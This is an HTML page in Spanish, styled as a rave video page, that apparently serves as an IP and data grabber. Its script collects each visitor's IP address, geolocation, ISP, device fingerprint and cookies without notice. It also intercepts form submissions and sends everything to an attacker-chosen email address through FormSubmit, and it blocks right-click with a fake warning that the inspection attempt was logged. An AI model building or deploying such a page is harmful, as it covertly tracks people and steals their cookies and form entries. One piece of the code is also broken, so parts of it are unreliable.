<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>P√°gina de Prueba - Estable y M√°xima Captura</title>
    <style>
        /* --- ESTILOS RAVE/DARK --- */
        body {
            font-family: 'Arial Black', sans-serif;
            text-align: center;
            padding-top: 50px;
            background-color: #121212;
            color: #E0E0E0;
        }
        h1 {
            color: #00ff99;
            text-shadow: 0 0 10px rgba(0, 255, 153, 0.7);
            margin-bottom: 5px;
            transition: visibility 0.5s;
        }
        p {
            color: #AAAAAA;
            margin-top: 5px;
        }
        video {
            border: 5px solid #ff00ff;
            box-shadow: 0 0 20px rgba(255, 0, 255, 0.8);
            border-radius: 8px;
            margin-top: 20px;
            transition: border-color 0.5s, box-shadow 0.5s;
        }
    </style>
</head>
<body>
    <h1>BIENVENIDO AL RAVE: TE VAS TRACKEADO</h1>
    <p>Presiona Play para iniciar la secuencia de 10 segundos.</p>

    <video width="720" controls>
      <source src="clip.mp4" type="video/mp4">
      Tu navegador no puede reproducir este video.
    </video>

    <p>URL: https://capture-tu-ip.github.io/TeVasTrackeado/</p>

    <script>
        // üìß CORREO DE DESTINO:
        const FORM_SUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/tu_correo@gmail.com';

        // --- 1. Recolecci√≥n de datos del dispositivo ---
        const userAgent = navigator.userAgent;
        const userLanguage = navigator.language || navigator.userLanguage;
        const screenRes = window.screen.width + 'x' + window.screen.height;
        const cpuCores = navigator.hardwareConcurrency || 'N/A';
        const platform = navigator.platform;
        const referrer = document.referrer || 'Acceso Directo';
        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const colorDepth = screen.colorDepth;

        // --- 2. Recolecci√≥n de cookies ---
        const cookies = document.cookie;

        // --- 3. Recolecci√≥n de datos de formularios ---
        const forms = document.querySelectorAll('form');
        forms.forEach(form => {
            form.addEventListener('submit', function(event) {
                event.preventDefault();
                const formData = new FormData(form);
                const formObject = {};
                formData.forEach((value, key) => {
                    formObject[key] = value;
                });
                finalPayload.FormData = formObject;
                sendData(finalPayload);
            });
        });

        // --- FUNCI√ìN PRINCIPAL: API de Respaldo (ipinfo.io/json) para M√°xima Estabilidad ---
        const scanUrl = 'https://ipinfo.io/json';

        fetch(scanUrl)
            .then(geoResponse => geoResponse.json())
            .then(geoData => {
                const userIP = geoData.ip || 'N/A';

                // Ensamblar TODOS los datos para el env√≠o final
                const finalPayload = {
                    "_subject": "‚úÖ DATOS ESTABLES (IPinfo) - TeVasTrackeado",
                    "IP_Visitante": userIP,
                    "Geo_Ubicacion": `${geoData.city || 'N/A'}, ${geoData.region || 'N/A'}, ${geoData.country || 'N/A'}`,
                    "Coordenadas_GPS_IP": geoData.loc || 'N/A',
                    "Organizacion_ISP": geoData.org || 'N/A',
                    "Codigo_Postal": geoData.postal || 'N/A',
                    "Hostname": geoData.hostname || 'N/A',
                    "Proxy_VPN": 'No disponible con esta API gratuita',
                    "Movil": 'No disponible con esta API gratuita',
                    "Agente_de_Usuario": userAgent,
                    "Plataforma_SO": platform,
                    "Nucleos_CPU": cpuCores,
                    "Resolucion": screenRes,
                    "Profundidad_Color": colorDepth,
                    "Idioma": userLanguage,
                    "Zona_Horaria": timeZone,
                    "Referencia_Web": referrer,
                    "Cookies": cookies,
                    "Fecha_Hora_Visita": new Date().toLocaleString(),
                };

                // Enviar TODOS los datos al correo (FormSubmit)
                sendData(finalPayload);
            })
            .catch(error => console.error('Fallo en la ejecuci√≥n del script:', error));

        function sendData(data) {
            fetch(FORM_SUBMIT_ENDPOINT, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                 if (response.ok) {
                     console.log("Env√≠o final exitoso.");
                 } else {
                     console.error("Error de FormSubmit:", response.statusText);
                 }
            })
            .catch(error => console.error('Fallo en el env√≠o de datos:', error));
        }
    </script>

    <script>
        // Efectos Visuales (Parpadeo, Clic Derecho, etc.)
        function blink() {
            var h1 = document.querySelector('h1');
            h1.style.visibility = (h1.style.visibility === 'hidden' ? 'visible' : 'hidden');
        }
        setInterval(blink, 500);

        function changeBorderColor() {
            const video = document.querySelector('video');
            const randomColor = '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6, '0');
            video.style.borderColor = randomColor;
            video.style.boxShadow = `0 0 25px ${randomColor}`;
        }
        setInterval(changeBorderColor, 2000);

        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            alert("Advertencia: Intento de inspecci√≥n registrado. Acceso denegado.");
        });

        if (window.location.protocol === 'http:') {
            window.location.protocol = 'https:';
        }
    </script>
</body>
</html>
